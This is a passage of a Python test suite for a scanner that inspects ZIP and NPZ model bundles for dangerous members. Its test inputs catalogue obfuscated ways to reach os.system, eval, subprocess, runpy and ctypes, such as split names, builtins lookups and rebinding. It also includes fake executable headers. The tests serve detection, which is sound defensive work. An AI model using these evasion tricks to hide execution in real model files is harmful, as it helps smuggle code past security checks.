            "loader = ctypes.LibraryLoader(len)\ndel loader._dlltype\n"
            "def restore(self, name):\n"
            "    runpy.run_path = original\n"
            "    return len\n"
            "ctypes.LibraryLoader.__getattr__ = restore\n"
            "getattr(loader, '_dlltype')\nrunpy.run_path('payload.py')\n",
            "S108",
        ),
        (
            "import ctypes\nimport runpy\noriginal = runpy.run_path\nrunpy.run_path = print\n"
            "def restore(self, value):\n"
            "    runpy.run_path = original\n"
            "    return value\n"
            "ctypes.LibraryLoader.__add__ = restore\n"
            "loader = ctypes.LibraryLoader(len)\nloader + 0\nrunpy.run_path('payload.py')\n",
            "S108",
        ),
        (
            "import ctypes\nimport runpy\noriginal = runpy.run_path\nrunpy.run_path = print\n"
            "def restore(self):\n"
            "    runpy.run_path = original\n"
            "    return 1\n"
            "ctypes.LibraryLoader.__len__ = restore\n"
            "loader = ctypes.LibraryLoader(len)\nif loader:\n    pass\nrunpy.run_path('payload.py')\n",
            "S108",
        ),
        (
            "import builtins\nimport runpy\nbuiltins.print = False\n"
            "from builtins import print as gate\nrunner = gate or runpy.run_path\nrunner('payload.py')\n",
            "S108",
        ),
        (
            "import builtins\nimport ctypes\nbuiltins.len = False\n"
            "from builtins import len as gate\nloader = gate or ctypes.CDLL\nloader('payload.so')\n",
            "S110",
        ),
    ],
)
def test_scan_zip_flags_rebound_safe_proof_execution(tmp_path: Path, source: str, rule_code: str) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and check.rule_code == rule_code
        for check in result.checks
    )


def test_scan_zip_ignores_shadowed_namespace_mapping_helper(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "import os\nvars = lambda _: {'system': print}\nvars(os)['system']('safe')\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
    )


@pytest.mark.parametrize(
    "source",
    [
        "__builtins__['ev' + 'al']('1 + 1')\n",
        "__builtins__.get('ev' + 'al')('1 + 1')\n",
        "namespace = __builtins__\nnamespace['ev' + 'al']('1 + 1')\n",
        "__builtins__.__dict__['ev' + 'al']('1 + 1')\n",
        "vars(__builtins__)['ev' + 'al']('1 + 1')\n",
        "__builtins__.eval('1 + 1')\n",
        "getattr(__builtins__, 'ev' + 'al')('1 + 1')\n",
        "namespace = __builtins__\nnamespace.eval('1 + 1')\n",
        "flag = False\nif flag:\n    __builtins__ = {'eval': print}\n__builtins__['ev' + 'al']('1 + 1')\n",
    ],
)
def test_scan_zip_flags_implicit_builtins_mapping_dangerous_python_member(tmp_path: Path, source: str) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == "S104"
    assert python_checks[0].details["reason"] == "high-risk calls: builtins.eval"


def test_scan_zip_ignores_shadowed_implicit_builtins_mapping(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "__builtins__ = {'eval': print}\n__builtins__['eval']('safe')\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
    )


@pytest.mark.parametrize(
    "source",
    [
        "globals()['__builtins__']['ev' + 'al']('1 + 1')\n",
        "globals().get('__builtins__').get('ev' + 'al')('1 + 1')\n",
        "namespace = globals()['__builtins__']\nnamespace['ev' + 'al']('1 + 1')\n",
        "globals()['__builtins__'].__dict__['ev' + 'al']('1 + 1')\n",
        "globals()['__builtins__'].eval('1 + 1')\n",
        "getattr(globals()['__builtins__'], 'ev' + 'al')('1 + 1')\n",
        "getattr(globals()['__builtins__'], '__getitem__')('ev' + 'al')('1 + 1')\n",
        "namespace = globals()['__builtins__']\nnamespace.eval('1 + 1')\n",
        "namespace = globals()\nnamespace['__builtins__']['ev' + 'al']('1 + 1')\n",
        "locals()['__builtins__']['ev' + 'al']('1 + 1')\n",
        "vars()['__builtins__']['ev' + 'al']('1 + 1')\n",
        "namespace = locals()\nnamespace['__builtins__']['ev' + 'al']('1 + 1')\n",
        "namespace = vars()\nnamespace['__builtins__']['ev' + 'al']('1 + 1')\n",
        "lookup = locals().get\nlookup('__builtins__')['ev' + 'al']('1 + 1')\n",
        "lookup = vars().get\nlookup('__builtins__')['ev' + 'al']('1 + 1')\n",
        "dict.__getitem__(locals(), '__builtins__')['ev' + 'al']('1 + 1')\n",
        "if enabled:\n    locals()['__builtins__']['ev' + 'al']('1 + 1')\n",
        (
            "namespace = locals()\ndef run():\n    __builtins__ = {'eval': print}\n"
            "    namespace['__builtins__']['ev' + 'al']('1 + 1')\nrun()\n"
        ),
        "def run(namespace=locals()):\n    namespace['__builtins__']['ev' + 'al']('1 + 1')\nrun()\n",
        "def run(namespace=vars()):\n    namespace['__builtins__']['ev' + 'al']('1 + 1')\nrun()\n",
        "def run(locals, namespace=locals()):\n    namespace['__builtins__']['ev' + 'al']('1 + 1')\nrun(None)\n",
        "def run(vars, namespace=vars()):\n    namespace['__builtins__']['ev' + 'al']('1 + 1')\nrun(None)\n",
        "run = lambda namespace=locals(): namespace['__builtins__']['eval']('1 + 1')\nrun()\n",
        (
            "import builtins\n"
            "[locals()['__builtins__']['ev' + 'al']('1 + 1') "
            "for __builtins__ in (builtins.__dict__,)]\n"
        ),
        (
            "import builtins\n"
            "[locals()['__builtins__']['ev' + 'al']('1 + 1') "
            "for (__builtins__,) in ((builtins.__dict__,),)]\n"
        ),
        (
            "import builtins\n"
            "[locals()['__builtins__']['ev' + 'al']('1 + 1') "
            "for [__builtins__] in ([builtins.__dict__],)]\n"
        ),
        "def run():\n    __builtins__ = {'eval': print}\n    globals()['__builtins__']['eval']('1 + 1')\nrun()\n",
    ],
)
def test_scan_zip_flags_globals_builtins_mapping_dangerous_python_member(tmp_path: Path, source: str) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == "S104"
    assert python_checks[0].details["reason"] == "high-risk calls: builtins.eval"


@pytest.mark.parametrize(
    "source",
    [
        "globals = lambda: {'__builtins__': {'eval': print}}\nglobals()['__builtins__']['eval']('safe')\n",
        "locals = lambda: {'__builtins__': {'eval': print}}\nlocals()['__builtins__']['eval']('safe')\n",
        "vars = lambda: {'__builtins__': {'eval': print}}\nvars()['__builtins__']['eval']('safe')\n",
        "__builtins__ = {'eval': print}\nglobals()['__builtins__']['eval']('safe')\n",
        "__builtins__ = {'eval': print}\nlocals()['__builtins__']['eval']('safe')\n",
        "__builtins__ = {'eval': print}\nvars()['__builtins__']['eval']('safe')\n",
        (
            "enabled = True\nif enabled:\n    __builtins__ = {'eval': print}\n"
            "    locals()['__builtins__']['eval']('safe')\n"
        ),
        (
            "enabled = True\nif enabled:\n    __builtins__ = {'eval': print}\n"
            "    lookup = vars().get\n    lookup('__builtins__')['eval']('safe')\n"
        ),
        (
            "enabled = True\nif enabled:\n    __builtins__ = {'eval': print}\n"
            "    globals()['__builtins__']['eval']('safe')\n"
        ),
        "import os\nlookup = globals().get\nlookup('__builtins__', os.system)('safe')\n",
        "import os\ndict.get(globals(), '__builtins__', os.__dict__)['system']('safe')\n",
    ],
)
def test_scan_zip_ignores_shadowed_globals_builtins_mapping(tmp_path: Path, source: str) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
    )


@pytest.mark.parametrize(
    "source",
    [
        "def run():\n    __builtins__ = {'eval': print}\n    locals()['__builtins__']['eval']('safe')\nrun()\n",
        "def run():\n    __builtins__ = {'eval': print}\n    vars()['__builtins__']['eval']('safe')\nrun()\n",
        "class Safe:\n    __builtins__ = {'eval': print}\n    locals()['__builtins__']['eval']('safe')\n",
        (
            "import builtins\ndef run():\n    __builtins__ = builtins\n"
            "    locals()['__builtins__']['eval']('safe')\nrun()\n"
        ),
        (
            "import builtins\ndef run():\n    __builtins__ = builtins.__dict__\n"
            "    locals()['__builtins__'].eval('safe')\nrun()\n"
        ),
        (
            "import builtins\ndef run():\n    __builtins__ = builtins\n"
            "    vars()['__builtins__']['eval']('safe')\nrun()\n"
        ),
        (
            "import builtins\ndef run():\n    __builtins__ = builtins.__dict__\n"
            "    vars()['__builtins__'].eval('safe')\nrun()\n"
        ),
        "[locals()['__builtins__']['eval']('safe') for __builtins__ in ({'eval': print},)]\n",
        "[locals()['__builtins__']['eval']('safe') for _ in (1,)]\n",
        "{locals()['__builtins__']['eval']('safe') for __builtins__ in ({'eval': print},)}\n",
        "{locals()['__builtins__']['eval']('safe') for _ in (1,)}\n",
        "{1: locals()['__builtins__']['eval']('safe') for __builtins__ in ({'eval': print},)}\n",
        "{1: locals()['__builtins__']['eval']('safe') for _ in (1,)}\n",
        "(locals()['__builtins__']['eval']('safe') for __builtins__ in ({'eval': print},))\n",
        "(locals()['__builtins__']['eval']('safe') for _ in (1,))\n",
    ],
)
def test_scan_zip_ignores_non_module_local_mappings(tmp_path: Path, source: str) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_zip_ignores_conditionally_bound_local_namespace_without_global_fallback(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "def run(flag, safe):\n    if flag:\n        os = safe\n    os.system('safe')\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_zip_ignores_conditionally_bound_local_builtins_without_global_fallback(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "def run(flag):\n    if flag:\n        __builtins__ = {'eval': print}\n    __builtins__['eval']('safe')\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
    )


@pytest.mark.parametrize(
    "source",
    [
        ("import os\nnamespace = os.__dict__\nnamespace['runner'] = os.system\nnamespace['runner']('echo hidden')\n"),
        (
            "import os\n"
            "namespace = os.__dict__\n"
            "namespace['system'] = print\n"
            "namespace['system'] = os.system\n"
            "namespace['system']('echo hidden')\n"
        ),
        (
            "import os\n"
            "namespace = os.__dict__\n"
            "namespace['system'] = print\n"
            "for _ in (1,):\n"
            "    namespace['system'] = os.system\n"
            "namespace['system']('echo hidden')\n"
        ),
        (
            "import os\n"
            "namespace = os.__dict__\n"
            "namespace['system'] = print\n"
            "class Rebind:\n"
            "    namespace['system'] = os.system\n"
            "namespace['system']('echo hidden')\n"
        ),
        "import os\nos.__dict__['system'] = print\nos.system = os.popen\nos.system('echo hidden')\n",
        "import os\nfor _ in (1,):\n    break\n    os.system = print\nos.system('echo hidden')\n",
        "import os\nfor _ in (1,):\n    continue\n    os.__dict__['system'] = print\nos.system('echo hidden')\n",
    ],
)
def test_scan_zip_flags_namespace_member_rebound_to_dangerous_callable(tmp_path: Path, source: str) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and check.details["reason"] == "high-risk calls: os.system"
        for check in result.checks
    )


def test_scan_zip_bounds_large_concatenated_getattr_names(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    padding = " + ".join(["''"] * 300)
    source = f"import os\ngetattr(os, 'sys' + {padding} + 'tem')('echo hidden')\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_zip_flags_padded_split_literal_getattr_name(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    padding = " + ".join(["''"] * 160)
    source = f"import os\ngetattr(os, 'sys' + {padding} + 'tem')('echo hidden')\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and check.details["reason"] == "high-risk calls: os.system"
        for check in result.checks
    )


def test_scan_zip_flags_rebound_dangerous_python_member(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "import subprocess\nrunner = subprocess.run\nrunner(['echo', 'hidden'], check=False)\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].severity == IssueSeverity.WARNING
    assert python_checks[0].details["reason"] == "high-risk calls: subprocess.run"


def test_scan_zip_flags_default_rebound_dangerous_python_member(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import subprocess\ndef handler(runner=subprocess.run) -> None:\n    runner(['echo', 'hidden'], check=False)\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].severity == IssueSeverity.WARNING
    assert python_checks[0].details["reason"] == "high-risk calls: subprocess.run"


def test_scan_zip_import_aliases_are_scoped_per_python_member(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import subprocess\n"
        "def helper() -> str:\n"
        "    import os as subprocess\n"
        "    return subprocess.getcwd()\n"
        "def handler() -> None:\n"
        "    subprocess.run(['echo', 'hidden'], check=False)\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].details["reason"] == "high-risk calls: subprocess.run"


def test_scan_zip_method_does_not_capture_class_attribute_alias(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import subprocess\n"
        "class Handler:\n"
        "    subprocess = None\n"
        "    def run(self) -> None:\n"
        "        subprocess.run(['echo', 'hidden'], check=False)\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].details["reason"] == "high-risk calls: subprocess.run"


def test_scan_zip_empty_loop_target_does_not_hide_later_dangerous_call(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "import subprocess\nfor subprocess in ():\n    pass\nsubprocess.run(['echo', 'hidden'], check=False)\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].details["reason"] == "high-risk calls: subprocess.run"


def test_eager_generator_consumer_applies_safe_module_member_overwrite() -> None:
    source = b"import ctypes as c\nlist(c.__dict__.update(CDLL=print) for _ in [0])\nloader = c.CDLL\nloader('safe')\n"

    assert not any(call.rule_code == "S110" for call in high_risk_python_calls_in_source(source))


def test_shadowed_generator_consumer_does_not_apply_module_member_overwrite() -> None:
    source = (
        b"import ctypes as c\n"
        b"list = lambda iterable: None\n"
        b"list(c.__dict__.update(CDLL=print) for _ in [0])\n"
        b"loader = c.CDLL\n"
        b"loader('payload.so')\n"
    )

    assert any(call.rule_code == "S110" for call in high_risk_python_calls_in_source(source))


@pytest.mark.parametrize(
    "consumer",
    [
        "list(c.__dict__.update(CDLL=print) for _ in [0] if False)",
        "list(print if True else c.__dict__.update(CDLL=print) for _ in [0])",
        "any(True if i == 0 else c.__dict__.update(CDLL=print) for i in [0, 1])",
        "all(False if i == 0 else c.__dict__.update(CDLL=print) for i in [0, 1])",
    ],
)
def test_generator_consumer_does_not_apply_skipped_module_member_overwrite(consumer: str) -> None:
    source = f"import ctypes as c\n{consumer}\nloader = c.CDLL\nloader('payload.so')\n".encode()

    assert any(call.rule_code == "S110" for call in high_risk_python_calls_in_source(source))


def test_scan_zip_nonempty_loop_target_shadows_dangerous_import(tmp_path: Path) -> None:
    archive_path = tmp_path / "source_bundle.zip"
    source = "import subprocess\nfor subprocess in (object(),):\n    pass\nsubprocess.run()\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("preprocess.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert result.success is True
    assert not any(check.name == "Python Archive Member Security" for check in result.checks)
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_scan_zip_conditional_target_does_not_hide_later_dangerous_call(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "import subprocess\nif False:\n    subprocess = None\nsubprocess.run(['echo', 'hidden'], check=False)\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].details["reason"] == "high-risk calls: subprocess.run"


def test_scan_zip_conditional_aliases_preserve_dangerous_branch(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "if __name__:\n"
        "    import subprocess as sp\n"
        "else:\n"
        "    import os as sp\n"
        "sp.run(['echo', 'hidden'], check=False)\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].details["reason"] == "high-risk calls: subprocess.run"


def test_scan_zip_loop_body_alias_survives_to_later_dangerous_call(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "for _ in (1,):\n    import subprocess as sp\nsp.run(['echo', 'hidden'], check=False)\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].details["reason"] == "high-risk calls: subprocess.run"


def test_scan_zip_ignores_shadowed_dangerous_import_name(tmp_path: Path) -> None:
    archive_path = tmp_path / "source_bundle.zip"
    source = (
        "import subprocess\n"
        "class Runner:\n"
        "    def run(self) -> str:\n"
        "        return 'ok'\n"
        "subprocess = Runner()\n"
        "subprocess.run()\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("preprocess.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert result.success is True
    assert not any(check.name == "Python Archive Member Security" for check in result.checks)
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_scan_zip_ignores_benign_python_member(tmp_path: Path) -> None:
    archive_path = tmp_path / "source_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("preprocess.py", "def normalize(value: float) -> float:\n    return value / 255.0\n")

    result = ZipScanner().scan(str(archive_path))

    assert result.success is True
    assert not any(check.name == "Python Archive Member Security" for check in result.checks)
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_scan_zip_marks_malformed_python_member_incomplete(tmp_path: Path) -> None:
    archive_path = tmp_path / "source_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", "def handler(:\n    pass\n")

    result = ZipScanner().scan(str(archive_path))

    assert result.success is False
    assert result.metadata["analysis_incomplete"] is True
    assert "zip_python_member_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].details["entry"] == "handler.py"
    assert python_checks[0].details["analysis_incomplete"] is True


def test_scan_npz_flags_dangerous_python_member(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.npz"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("arrays.npy", _npy_payload())
        archive.writestr("handler.py", "import os\nos.system('echo hidden')\n")

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].severity == IssueSeverity.WARNING
    assert python_checks[0].details["entry"] == "handler.py"


def test_scan_npz_flags_executable_member(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.npz"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("arrays.npy", _npy_payload())
        archive.writestr("bin/run.sh", "#!/bin/sh\necho hidden\n")

    result = ZipScanner().scan(str(archive_path))

    executable_checks = [
        check
        for check in result.checks
        if check.name == "Executable Archive Member Detection" and check.status == CheckStatus.FAILED
    ]
    assert len(executable_checks) == 1
    assert executable_checks[0].severity == IssueSeverity.WARNING
    assert executable_checks[0].details["entry"] == "bin/run.sh"


def test_scan_npz_flags_extensionless_executable_member(tmp_path: Path) -> None:
    """Executable payloads should not need a helpful suffix inside ZIP-like archives."""
    archive_path = tmp_path / "model_bundle.npz"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("arrays.npy", _npy_payload())
        archive.writestr("bin/runme", b"\x7fELF" + b"\x00" * 64)

    result = ZipScanner().scan(str(archive_path))

    executable_checks = [
        check
        for check in result.checks
        if check.name == "Executable Archive Member Detection" and check.status == CheckStatus.FAILED
    ]
    assert len(executable_checks) == 1
    assert executable_checks[0].severity == IssueSeverity.WARNING
    assert executable_checks[0].details["entry"] == "bin/runme"


def test_scan_npz_ignores_extensionless_executable_near_match(tmp_path: Path) -> None:
    """Near-match member bytes should not become executable findings."""
    archive_path = tmp_path / "model_bundle.npz"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("arrays.npy", _npy_payload())
        archive.writestr("bin/runme", b"\x7fELG" + b"\x00" * 64)

    result = ZipScanner().scan(str(archive_path))

    assert not any(check.name == "Executable Archive Member Detection" for check in result.checks)


def test_scan_npz_ignores_java_class_header_near_match(tmp_path: Path) -> None:
    """Java class files should not be mistaken for Mach-O fat binaries."""
    archive_path = tmp_path / "model_bundle.npz"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("arrays.npy", _npy_payload())
        archive.writestr("Foo.class", b"\xca\xfe\xba\xbe\x00\x00\x00\x3d" + b"\x00" * 64)

    result = ZipScanner().scan(str(archive_path))

    assert not any(check.name == "Executable Archive Member Detection" for check in result.checks)


def test_scan_npz_flags_extensionless_pe_member_with_late_header(tmp_path: Path) -> None:
    """Extensionless PEs with large DOS stubs should still be detected by content."""
    archive_path = tmp_path / "model_bundle.npz"
    payload = bytearray(2048)
    payload[:2] = b"MZ"
    payload[0x3C:0x40] = (1536).to_bytes(4, "little")
    payload[1536:1540] = b"PE\x00\x00"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("arrays.npy", _npy_payload())
        archive.writestr("bin/runme", payload)

    result = ZipScanner().scan(str(archive_path))

    executable_checks = [
        check
        for check in result.checks
        if check.name == "Executable Archive Member Detection" and check.status == CheckStatus.FAILED
    ]
    assert len(executable_checks) == 1
    assert executable_checks[0].details["entry"] == "bin/runme"


def test_scan_npz_marks_unconfirmed_pe_pointer_inconclusive(tmp_path: Path) -> None:
    """A bounded PE probe cannot report an executable without confirmation bytes."""
    archive_path = tmp_path / "model_bundle.npz"
    payload = bytearray(64)
    payload[:2] = b"MZ"
    payload[0x3C:0x40] = ((1024 * 1024) + 1).to_bytes(4, "little")
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("arrays.npy", _npy_payload())
        archive.writestr("bin/runme", payload)

    result = ZipScanner().scan(str(archive_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "zip_executable_member_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
    assert not any(
        check.name == "Executable Archive Member Detection" and check.severity == IssueSeverity.WARNING
        for check in result.checks
    )


@pytest.mark.parametrize(
    "payload",
    [
        b"\xca\xfe\xba\xbf" + (1).to_bytes(4, "big") + b"\x00" * 64,
        b"\xbf\xba\xfe\xca" + (1).to_bytes(4, "little") + b"\x00" * 64,
    ],
)
def test_scan_npz_flags_extensionless_macho_fat64_members(tmp_path: Path, payload: bytes) -> None:
    """ZIP-like archives should flag both endian variants of Mach-O fat64 binaries."""
    archive_path = tmp_path / "model_bundle.npz"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("arrays.npy", _npy_payload())
        archive.writestr("bin/runme", payload)

    result = ZipScanner().scan(str(archive_path))

    executable_checks = [
        check
        for check in result.checks
        if check.name == "Executable Archive Member Detection" and check.status == CheckStatus.FAILED
    ]
    assert len(executable_checks) == 1
    assert executable_checks[0].details["entry"] == "bin/runme"


def test_scan_npz_ignores_numpy_member_near_python_suffix(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.npz"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("feature_py.npy", _npy_payload())

    result = ZipScanner().scan(str(archive_path))

    assert result.success is True
    assert not any(check.name == "Python Archive Member Security" for check in result.checks)
    assert not any(check.name == "Executable Archive Member Detection" for check in result.checks)


def test_scan_zip_ignores_benign_python_file_operations(tmp_path: Path) -> None:
    archive_path = tmp_path / "source_bundle.zip"
    source = (
        "from pathlib import Path\n"
        "def load_config() -> tuple[str, str]:\n"
        "    left = open('config-a.json', encoding='utf-8').read()\n"
        "    right = open('config-b.json', encoding='utf-8').read()\n"
        "    return left, right\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("preprocess.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert result.success is True
    assert not any(check.name == "Python Archive Member Security" for check in result.checks)
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


@pytest.mark.parametrize(
    ("source", "expected_rule_code", "expected_call"),
    [
        ("import os\nos.system('echo hidden')\n", "S101", "os.system"),
        ("import os\nos.popen('echo hidden')\n", "S101", "os.popen"),
        ("import subprocess\nsubprocess.run(['echo'], check=False)\n", "S103", "subprocess.run"),
        ("import importlib\nimportlib.import_module('os')\n", "S107", "importlib.import_module"),
        ("import runpy\nrunpy.run_path('payload.py')\n", "S108", "runpy.run_path"),
        ("eval('1 + 1')\n", "S104", "eval"),
        ("import pickle\npickle.loads(b'\\x80\\x04N.')\n", "S213", "pickle.loads"),
        ("__import__('os').system('echo hidden')\n", "S106", "__import__"),
    ],
)
def test_scan_zip_python_member_emits_accurate_rule_code(
    tmp_path: Path, source: str, expected_rule_code: str, expected_call: str
) -> None:
    """Each risk category must surface its own rule code (os.system as S101, etc.)."""
    archive_path = tmp_path / "source_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == expected_rule_code
    assert expected_call in python_checks[0].details["reason"]


@pytest.mark.parametrize(
    ("source", "expected_rule_code", "expected_call"),
    [
        (b"import operator, os\noperator.attrgetter('system')(os)('id')\n", "S101", "os.system"),
        (
            b"import operator, os\noperator.attrgetter('system.__call__')(os)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\noperator.itemgetter('system')(os.__dict__)('id')\n",
            "S101",
            "os.system",
        ),
        (
            b"import operator, os\noperator.attrgetter('getcwd', 'system')(os)[1]('id')\n",
            "S101",
            "os.system",
        ),
        (
